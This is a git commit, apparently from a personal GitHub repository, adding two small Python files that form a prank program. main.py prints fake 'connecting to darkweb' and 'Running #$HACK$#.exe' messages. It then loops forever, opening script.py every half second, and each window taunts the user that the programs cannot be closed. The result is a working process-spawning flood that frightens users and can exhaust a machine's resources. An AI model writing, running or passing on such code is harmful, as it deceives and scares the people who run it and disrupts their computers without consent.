8e26327be11562f7bbdb1fc98db470eb4324ec95
Taha-Adler <125276777+Taha-Adler@users.noreply.github.com>
2023-02-13 16:54:53 +0330

    Add files via upload

---
+++ main.py
@@ -0,0 +1,15 @@
+import os
+from time import sleep
+
+print("connecting to darkweb...")
+sleep(2)
+print("Downloading component...")
+sleep(1)
+print("Download component. Running #$HACK$#.exe...")
+sleep(2)
+
+
+while True:
+    os.startfile("script.py")
+    sleep(0.5)
+    
---
+++ script.py
@@ -0,0 +1,2 @@
+print("#$HACK$#.exe runned successfully. HEHEHEH...\n")
+input("You can not close these programs.\n \n from Adler : (-_-) ")
